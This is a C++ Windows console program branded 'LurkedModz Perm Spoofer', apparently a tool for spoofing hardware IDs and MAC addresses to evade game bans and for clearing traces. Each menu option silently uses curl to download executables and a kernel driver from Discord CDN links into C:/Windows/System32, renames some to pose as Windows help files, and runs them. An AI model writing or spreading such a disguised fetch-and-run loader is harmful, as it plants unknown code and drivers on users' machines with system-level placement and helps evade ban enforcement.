#include <iostream>
#include <cstdlib>
#include <locale>
#include <cstdio>
#include <windows.h>
#include <io.h>
#include <fcntl.h>

using namespace std;
void NoScrollBar()
{
    CONSOLE_SCREEN_BUFFER_INFO screenBufferInfo;

    // Get console handle and get screen buffer information from that handle.
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsole, &screenBufferInfo);

    // Get rid of the scrollbar by setting the screen buffer size the same as 
    // the console window size.
    COORD new_screen_buffer_size;

    // screenBufferInfo.srWindow allows us to obtain the width and height info 
    // of the visible console in character cells.
    // That visible portion is what we want to set the screen buffer to, so that 
    // no scroll bars are needed to view the entire buffer.
    new_screen_buffer_size.X = screenBufferInfo.srWindow.Right -
        screenBufferInfo.srWindow.Left + 1; // Columns
    new_screen_buffer_size.Y = screenBufferInfo.srWindow.Bottom -
        screenBufferInfo.srWindow.Top + 1; // Rows 

    // Set new buffer size
    SetConsoleScreenBufferSize(hConsole, new_screen_buffer_size);
}

int main()
{
    NoScrollBar();
    while (true) {
        SetConsoleTitleA("LurkedModz");

        std::cout << "                                                   " << std::endl;
        std::cout << "                                                   " << std::endl;
        std::cout << "                                                 LurkedModz Perm Spoofer  " << std::endl;

        system("color 5");
        std::cout << "\n\n";
        std::cout << "  [+] Options\n\n" << std::endl;
        std::cout << "  [1] Perm Spoofer\n" << std::endl;
        std::cout << "  [2] Clean Traces\n" << std::endl;
        std::cout << "  [3] Mac Address Spoof\n\n" << std::endl;
        std::cout << "  [4] Serial Checker \n" << std::endl;

        int options;
        cout << "  Choice: ";
        cin >> options;
        if (options == 1) {
            std::cout << "  [+] Perm Spoofing Your Computer\n\n" << std::endl;
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144782654143737926/RezwareWoof.exe --output C:/Windows/System32/Windows10Help1.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144782653858517103/AMIFLDRV64.SYS --output C:/Windows/System32/Windows10Help1.SYS >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144782654470897755/Volumeid64.exe --output C:/Windows/System32/Windows10Help3.exe >nul 2>&1");
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144784494025523220/1-spoofer.exe --output C:/Windows/System32/Windows10Help2.exe >nul 2>&1");
            system("start C:/Windows/System32/Windows10Help2.exe");
            std::cout << "  [+] Perm Spoofing Finished\n\n" << std::endl;
            Sleep(2000);
        }
        else if (options == 2) {
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144785500239044708/applecleaner.exe --output C:/Windows/System32/applecleaner.exe 2>&1");
            Sleep(2000);
            system("start C:/Windows/System32/applecleaner.exe");
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144786262570582046/traces.exe --output C:/Windows/System32/traces.exe 2>&1");
            Sleep(2000);
            system("start C:/Windows/System32/traces.exe");
        }
        else if (options == 3) {
            system("curl --silent https://cdn.discordapp.com/attachments/1144281210730840262/1144786659011989645/macaddress.exe --output C:/Windows/System32/macaddress.exe 2>&1");
            Sleep(2000);
            system("start C:/Windows/System32/macaddress.exe");
        }
        else if (options == 4) {
            system("curl --silent https://cdn.discordapp.com/attachments/1145823060037996585/1147983412154609774/lurked_bat_serial_checker.exe --output C:/Windows/System32/lurked_bat_serial_checker.exe 2>&1");
            Sleep(2000);
            system("start C:/Windows/System32/lurked_bat_serial_checker.exe");
        }
        else {
            return 0;
        }
        return 0;
    }
}